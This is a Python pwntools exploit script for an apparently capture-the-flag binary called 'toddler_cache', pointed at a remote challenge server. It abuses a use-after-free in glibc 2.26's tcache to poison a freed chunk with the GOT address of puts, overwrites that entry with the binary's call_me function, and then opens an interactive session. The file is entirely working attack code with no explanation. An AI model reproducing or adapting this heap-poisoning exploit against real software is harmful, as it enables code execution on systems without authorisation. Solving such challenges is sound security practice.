#!/usr/bin/env python3

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./toddler_cache')
libc = ELF("./libc-2.26.so")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41703)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(["/lib64/ld-linux-x86-64.so.2", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["/lib64/ld-linux-x86-64.so.2", exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


io = start()

def new():
    io.sendline("1")
    io.recvuntil("> > ")

def write(idx, data):
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline(str(idx))
    io.recvuntil("What would you like to write?\n")
    io.send(data)
    io.recvuntil("> >")

def free(idx):
    io.sendline("3")
    io.recvuntil("> > ")
    io.sendline(str(idx))
    io.recvuntil("> >")

new()
free(0)
write(0, p64(exe.got["puts"]))
new()
pause()
new()

io.sendline("2")
io.recvuntil("> ")
io.sendline(str(2))
io.recvuntil("What would you like to write?\n")
io.send(p64(exe.functions["call_me"].address))

io.interactive()

